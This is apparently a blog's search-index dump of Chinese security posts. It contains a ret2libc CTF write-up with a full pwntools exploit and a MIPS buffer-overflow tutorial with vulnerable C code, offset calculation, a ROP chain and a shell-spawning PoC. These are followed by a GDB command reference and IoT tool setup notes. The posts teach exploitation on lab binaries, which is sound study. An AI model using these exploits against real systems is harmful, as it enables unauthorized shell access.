<li>即使程序有<code>ASLR</code>保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而<code>libc</code>在<code>github</code>上有人进行收集。<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc</a></li>
</ul>
<p>所以如果我们知道<code>libc</code>中某个函数的地址，那么我们就可以确定该程序利用的<code>libc</code>。进而我们就可以知道 <code>system</code>函数的地址。 </p>
<p>那么如何得到<code>libc</code>中的某个函数的地址呢？我们一般常用的方法是采用<code>got</code>表泄露，即输出某个函数对应的<code>got</code>表项的内容。<strong>当然，由于<code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong> 根据上述方法找到<code>libc</code>之后查询偏移，获取<code>system</code>地址,手动操作有点复杂，而且<code>github</code>有个现成的<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">利用工具</a></p>
<p>此外，在得到<code>libc</code>之后，其实<code>libc</code>中也是有 /bin/sh 字符串的，所以我们可以一起获得<code>/bin/sh</code>字符串的地址。 </p>
<p>这里我们泄露<code>puts</code>的地址。基本利用思路如下:</p>
<ul>
<li>泄露<code>puts</code>地址</li>
<li>获取<code>libc</code>版本</li>
<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
<li>再次执行源程序(<code>puts</code>函数的回调，直接指向漏洞点)</li>
<li>触发栈溢出执行<code>system(‘/bin/sh’)</code></li>
</ul>
<p>整理的<code>EXP</code>如下:</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process(&#39;./pwn7&#39;)

ret2libc3 = ELF(&#39;./pwn7&#39;)

puts_plt = ret2libc3.plt[&#39;puts&#39;]
puts_got = ret2libc3.got[&#39;puts&#39;]
main = ret2libc3.symbols[&#39;main&#39;]

print &quot;leak puts_got addr and return to main again&quot;
payload = flat([&#39;A&#39; * 112, puts_plt, main, puts_got])
sh.sendlineafter(&#39;Can you find it !?&#39;, payload)

print &quot;get the related addr&quot;
puts_addr = u32(sh.recv()[0:4])
libc = LibcSearcher(&#39;puts&#39;, puts_addr)
libcbase = puts_addr - libc.dump(&#39;puts&#39;)
system_addr = libcbase + libc.dump(&#39;system&#39;)
binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)

print &quot;get shell&quot;
payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
</code></pre>
<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li>
<li><a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></li>
<li><a href="https://sp4n9x.github.io/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇-蒸米</a> </li>
</ul>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CTF</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GDB调试MIPS架构的缓冲区溢出</title>
    <url>/post/43075.html</url>
    <content><![CDATA[<h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
<p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p>
<a id="more"></a>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;sys/stat.h&gt;
#include&lt;unistd.h&gt;

void do_system(int code, char *cmd)
{
    char buf[255];
    //sleep(1);
    system(cmd);
}

void main()
{
    char buf[256] = {0};
    char ch;
    int count = 0;
    unsigned int fileLen = 0;
    struct stat fileData;
    FILE *fp;
    if(0 == stat(&quot;passwd&quot;, &amp;fileData))
        fileLen = fileData.st_size;
    else
        return 1;

    if ((fp = fopen(&quot;passwd&quot;, &quot;rb&quot;)) == NULL)
    {
        printf(&quot;Cannot open file passwd! \n&quot;);
        exit(1);
    }

    ch = fgetc(fp);
    while(count &lt;= fileLen){
        buf[count++] = ch;
        ch = fgetc(fp);
    }
    buf[--count] = &#39;\x00&#39;;

    if (!strcmp(buf, &quot;adminpwd&quot;))
    {
        do_system(count, &quot;ls -l&quot;);
    }
    else
    {
        printf(&quot;you have an invalid password!\n&quot;);
    }
    fclose(fp);

}</code></pre>
<p>使用mipsls-linux-gcc来编译程序</p>
<blockquote>
<p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p>
</blockquote>
<ul>
<li>-g 生成的可执行文件才能用gdb进行源码级调试</li>
<li>-o 输出文件的名称</li>
<li>-static 静态编译</li>
</ul>
<p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p>
<p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p>
<h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p>
<blockquote>
<p>qemu-mipsel -g 1234 vuln_system</p>
</blockquote>
<ul>
<li>-g 指定<code>qemu-mipsel</code>远程调试端口</li>
</ul>
<p>设置<code>gdb</code></p>
<pre><code class="shell">gdb-multiarch ./vuln_system

# 打开gdb后进行如下设置

pwndbg&gt; set endian little #设置小端序
The target is assumed to be little endian
pwndbg&gt; set architecture mips #设置为Mips架构
The target architecture is assumed to be mips
pwndbg&gt; target remote localhost:1234 #设置远程端口
</code></pre>
<p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
<p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
<blockquote>
<p>python -c “print ‘A’*600 “&gt; passwd</p>
</blockquote>
<p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p>
<p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p>
<p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p>
<h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p>
<h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
<p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
<h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
<pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0
sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4
sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8
move    $fp, $sp                //fp&lt;== sp
li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面
sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为                                        0x1D0+var_1C0
addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值
li      $v1, 0x100        //将立即数0x100传入v1
move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数
move    $a1, $zero        //zero寄存器里面永远为0
move    $a0, $v0          //a0=v0
la      $v0, memset      //复制memset地址至至v0中
move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量
bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放                                于Ra里面
nop</code></pre>
<p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p>
<blockquote>
<p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p>
</blockquote>
<p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p>
<pre><code class="shell">disassemble main # 查看main函数的汇编代码

break *main+740 # 在main函数后740行处下断点</code></pre>
<p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
<p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
<p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
<p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p>
<p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p>
<p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p>
<h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p>
<p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p>
<p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p>
<p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p>
<p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
<p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
<p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;
struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序
struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序
&quot;&quot;&quot;
import struct

cmd = &quot;sh&quot;                 # command string
cmd += &quot;\x00&quot;*(4 - (len(cmd) % 4))    # align by 4 bytes

#shellcode
shellcode = &quot;A&quot;*0x19C             # padding buf
shellcode += struct.pack(&quot;&lt;L&quot;,0x00401FA0) 
shellcode += &quot;A&quot;*24                # padding before command
shellcode += cmd                # command($a1)
shellcode += &quot;B&quot;*(0x3C - len(cmd))        # padding 
shellcode += struct.pack(&quot;&lt;L&quot;,0x00400678) 
shellcode += &quot;BBBB&quot;                # padding

print &#39; ok!&#39;

#create password file
print &#39;[+] create password file&#39;,
fw = open(&#39;passwd&#39;,&#39;w&#39;)
fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)
fw.close()
print &#39; ok!&#39;</code></pre>
<p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
<p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
<p>成功拿到shell</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li>
</ul>
]]></content>
      <categories>
        <category>安全</category>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>调试</tag>
        <tag>Debug</tag>
        <tag>Mips</tag>
        <tag>溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB调试命令--持续更新</title>
    <url>/post/25086.html</url>
    <content><![CDATA[<h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p>
<h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p>
<pre><code class="shell">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</code></pre>
<p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p>
<a id="more"></a>

<p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p>
<h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
<pre><code class="bash">$g++ -g hello.cpp -o hello</code></pre>
<p>调试可执行文件:</p>
<pre><code class="bash">$gdb &lt;program&gt;</code></pre>
<p>program也就是你的执行文件，一般在当前目录下。</p>
<p>调试core文件(core是程序非法执行后core dump后产生的文件):</p>
<pre><code class="bash">$gdb &lt;program&gt; &lt;core dump file&gt;
$gdb program core.11127</code></pre>
<p>调试服务程序:</p>
<pre><code class="bash">$gdb &lt;program&gt; &lt;PID&gt;
$gdb hello 11127</code></pre>
<p>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</p>
<h2 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h2><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
<li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li>
<li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li>
<li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li>
<li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li>
<li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li>
<li>until+行号： 运行至某行，不仅仅用来跳出循环</li>
<li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li>
<li>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</li>
<li>quit：简记为 q ，退出gdb</li>
</ul>
<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><ul>
<li><p>break n （简写b n）:在第n行处设置断点</p>
<p>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</p>
</li>
<li><p>b fn1 if a＞b：条件断点设置</p>
</li>
<li><p>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</p>
</li>
<li><p>delete 断点号n：删除第n个断点</p>
</li>
<li><p>disable 断点号n：暂停第n个断点</p>
</li>
<li><p>enable 断点号n：开启第n个断点</p>
</li>
<li><p>clear 行号n：清除第n行的断点</p>
</li>
<li><p>info b （info breakpoints） ：显示当前程序的断点设置情况</p>
</li>
<li><p>delete breakpoints：清除所有断点：</p>
</li>
</ul>
<h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul>
<li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li>
<li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li>
<li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li>
<li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li>
</ul>
<h3 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h3><ul>
<li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li>
<li>print a：将显示整数 a 的值</li>
<li>print ++a：将把 a 中的值加1,并显示出来</li>
<li>print name：将显示字符串 name 的值</li>
<li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li>
<li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li>
<li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li>
<li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li>
<li>whatis ：查询变量或函数</li>
<li>info function： 查询函数</li>
<li>扩展info locals： 显示当前堆栈页的所有变量</li>
</ul>
<h3 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h3><ul>
<li>where/bt ：当前运行的堆栈列表；</li>
<li>bt backtrace 显示当前调用堆栈</li>
<li>up/down 改变堆栈显示的深度</li>
<li>set args 参数:指定运行时的参数</li>
<li>show args：查看设置好的参数</li>
<li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li>
</ul>
<h3 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h3><ul>
<li>layout：用于分割窗口，可以一边查看代码，一边测试：</li>
<li>layout src：显示源代码窗口</li>
<li>layout asm：显示反汇编窗口</li>
<li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li>
<li>layout split：显示源代码和反汇编窗口</li>
<li>Ctrl + L：刷新窗口</li>
</ul>
<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便；</p>
<h2 id="补充一些其他操作"><a href="#补充一些其他操作" class="headerlink" title="补充一些其他操作"></a>补充一些其他操作</h2><h3 id="调试汇编代码"><a href="#调试汇编代码" class="headerlink" title="调试汇编代码"></a>调试汇编代码</h3><ul>
<li>b fun_name : 会跳过栈初始化的过程</li>
<li>b *func_name : 不会跳过栈初始化的过程</li>
<li>b *func_name+n: 在func_name函数偏移n行的位置下断点</li>
</ul>
<p>例如:</p>
<p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p>
<h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p>
<pre><code class="shell">gdb ./vuln_prog
run &lt; filename_with_input</code></pre>
<h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p>
<pre><code class="shell">stack n[要查看具体多少]</code></pre>
<p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>调试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>调试</tag>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT测试环境搭建</title>
    <url>/post/36656.html</url>
    <content><![CDATA[<h2 id="IoT分析环境搭建"><a href="#IoT分析环境搭建" class="headerlink" title="IoT分析环境搭建"></a>IoT分析环境搭建</h2><p>因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。</p>
<h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表:"></a>工具列表:</h2><ul>
<li>binwalk 固件提取</li>
<li>qemu 模拟执行</li>
<li><del>irmadyne 固件模拟工具</del>(这里没有安装)</li>
<li>buildroot Mips交叉编译环境</li>
<li>gdb 调试工具(可编译一个<a href="https://blog.csdn.net/zqj6893/article/details/84662579" target="_blank" rel="noopener">mips-linux-gdb</a>)</li>
<li>IDA</li>
<li>ghidra</li>
<li>GDBServer </li>
</ul>
<a id="more"></a>
<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><pre><code class="shell">$ sudo apt-get update  
$ sudo apt-get install build-essential autoconf git #安装依赖 

# https://github.com/devttys0/binwalk/blob/master/INSTALL.md  
$ git clone https://github.com/ReFirmLabs/binwalk.git
$ cd binwalk  

# python2.7 
$ sudo python setup.py install 

# Python3.x
$ sudo python3 setup.py install

$ sudo ./deps.sh #debian/Ubuntu可使用脚本自动安装依赖</code></pre>
<h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>Qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。 QEMU模拟器主要有两种比较常见的运作模式：</p>
<ul>
<li>User Mode（使用者模式） User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li>
<li>System Mode（系统模式）。 System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的</li>
</ul>
<h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><pre><code class="shell">$ git clone git://git.qemu.org/qemu.git

$ cd qemu

$ git submodule update --recursive
$ sudo apt install libglib2.0 libglib2.0-dev
$ sudo apt install autoconf automake libtoolcd 

$ ./configure

$ sudo make &amp;&amp; sudo make install</code></pre>
<p>ubuntu14.04中用源码方式编译安装qemu时,执行configure步骤提示错误：“ERROR: pixman &gt;= 0.21.8 not present.” 安装如下依赖：</p>
<pre><code class="shell">$ sudo apt-get install libpixman-1-dev</code></pre>
<h2 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h2><p>github : <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p>
<h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>下载地址 : <a href="https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz</a></p>
<pre><code class="shell">tar zxvf buildroot-2019.02.6.tar.gz

cd buildroot-2019.02.6

sudo apt-get install libncurses5-dev patch

make clean

make menuconfig</code></pre>
<p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p>
<ul>
<li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li>
<li>Target options -&gt; Target Architecture Variant 设置为 MIPS32</li>
<li>Toolchain -&gt; Kernal Headers 设置成机器Kennal版本</li>
</ul>
<p>选择Save保存, 之后开始编译,</p>
<pre><code class="shell">sudo make</code></pre>
<p>经过一个小时的编译，在目录下产生一个<code>output</code>的目录。编译产生的工具在<code>output/host/usr/bin</code>目录下</p>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>一般的Linux平台下自带了GDB</p>
<p>调试MIPS平台的程序，需要安装gdb-multiarch</p>
<pre><code class="shell">sudo apt install gdb-multiarch</code></pre>
<p>然后按照正常的GDB使用即可</p>
<h3 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h3><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。</p>
<pre><code class="shell">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</code></pre>
<h2 id="IDA-Linux"><a href="#IDA-Linux" class="headerlink" title="IDA(Linux)"></a>IDA(Linux)</h2><p>链接：<a href="https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw</a><br>提取码：076v </p>
<pre><code class="shell">$ sudo dpkg --add-architecture i386
$ sudo apt-get update
$ sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 


# 安装IDA插件:
git clone https://github.com/devttys0/ida.git

cd plugins

python install.py /IDA PATH/ --install </code></pre>
<h2 id="GDBServer"><a href="#GDBServer" class="headerlink" title="GDBServer"></a>GDBServer</h2><p>各个版本的GDBServer下载地址 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
</search>
